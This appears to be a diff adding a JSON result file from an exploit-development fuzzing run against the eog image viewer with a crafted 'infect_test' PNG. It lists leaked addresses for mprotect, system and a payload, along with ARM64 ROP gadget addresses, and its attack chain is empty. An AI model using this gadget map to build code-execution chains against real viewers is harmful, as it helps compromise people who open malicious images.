@@ -1,0 +1,31 @@
+{
+  "file": "infect_test.png.eog.aggressive_viewer.retry2.png",
+  "fuzz_type": "aggressive_viewer",
+  "chain_type": "ROP",
+  "attack_chain": [],
+  "leaked_addresses": {
+    "mprotect": "0xfffff7e77c00",
+    "system": "0xfffff7ddcec4",
+    "payload": "0xaaaaaaac0040",
+    "pop_x0_x1_x2_ret": "0xaaaaaaaa1418",
+    "ldp_x29_x30": "0xaaaaaaaa142c",
+    "pop_x0_x1_x2_x30_br_x0": "0xaaaaaaaa143c",
+    "jump_x0": "0xaaaaaaaa1450",
+    "load_mprotect_x3": "0xaaaaaaaa14b8",
+    "load_payload_x0": "0xaaaaaaaa14d0",
+    "br_x3": "0xaaaaaaaa14e8",
+    "ldr_x0_x1_br_x0": "0xaaaaaaaa14f4",
+    "mov_x0_x1_br_x0": "0xaaaaaaaa1504",
+    "ldr_x1_x0_br_x1": "0xaaaaaaaa1514",
+    "mov_x1_x0_br_x1": "0xaaaaaaaa1524",
+    "pop_x0_x1_ret": "0xaaaaaaaa1534",
+    "pop_x0_ret": "0xaaaaaaaa1544",
+    "pop_x1_ret": "0xaaaaaaaa1554",
+    "ldr_x0_sp_br_x0": "0xaaaaaaaa1564",
+    "ldr_x1_sp_br_x1": "0xaaaaaaaa1574",
+    "gadget_vop_fmov": "0xaaaaaaaa15d4",
+    "gadget_vop_ldr_str_q0": "0xaaaaaaaa15e8",
+    "gadget_mov_x0_x1_br_x0": "0xaaaaaaaa1504",
+    "gadget_ldr_x0_x1_br_x0": "0xaaaaaaaa14f4"
+  }
+}
